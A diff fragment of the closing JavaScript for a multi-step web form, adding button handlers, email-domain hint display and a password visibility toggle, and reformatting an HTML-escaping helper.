+        
+        // Attach event listeners
+        const nextBtn = document.getElementById('nextStepBtn');
+        const prevBtn = document.getElementById('prevStepBtn');
+        const submitFinal = document.getElementById('submitAllBtn');
+        
+        if (nextBtn) nextBtn.addEventListener('click', goToNextStep);
+        if (prevBtn) prevBtn.addEventListener('click', goToPrevStep);
+        if (submitFinal) submitFinal.addEventListener('click', finalSubmit);
+        
+        // Email domain detection
+        const emailInput = document.getElementById('emailInputField');
+        if (emailInput && stepIndex === 5) {
+            emailInput.addEventListener('input', (e) => {
+                const emailVal = e.target.value;
+                formData.email = emailVal;
+                const domainMsg = handleEmailDomainLogic(emailVal);
+                const alertBox = document.getElementById('domainAlertBox');
+                const domainMsgSpan = document.getElementById('domainMessage');
+                if (alertBox && domainMsgSpan) {
+                    if (domainMsg && emailVal) {
+                        alertBox.style.display = 'flex';
+                        domainMsgSpan.textContent = domainMsg;
+                    } else {
+                        alertBox.style.display = 'none';
+                    }
+                }
+            });
+        }
+        
+        // Toggle password visibility
+        const togglePwd = document.getElementById('togglePasswordIcon');
+        const pwdField = document.getElementById('passwordField');
+        if (togglePwd && pwdField) {
+            togglePwd.addEventListener('click', () => {
+                const type = pwdField.getAttribute('type') === 'password' ? 'text' : 'password';
+                pwdField.setAttribute('type', type);
+                togglePwd.innerHTML = type === 'password' ? '<i class="far fa-eye-slash"></i>' : '<i class="far fa-eye"></i>';
+            });
         }
     }
-
-    function escapeHtml(str) { if(!str) return ''; return str.replace(/[&<>]/g, function(m){if(m === '&') return '&amp;'; if(m === '<') return '&lt;'; if(m === '>') return '&gt;'; return m;}); }
-
-    // init
+    
+    function escapeHtml(str) { 
+        if(!str) return ''; 
+        return str.replace(/[&<>]/g, function(m){
+            if(m === '&') return '&amp;'; 
+            if(m === '<') return '&lt;'; 
+            if(m === '>') return '&gt;'; 
+            return m;
+        });
+    }
+    
+    // Initialize
     function init() {
         renderProgress();
         renderStep(0);
     }
+    
     init();
 </script>
 </body>
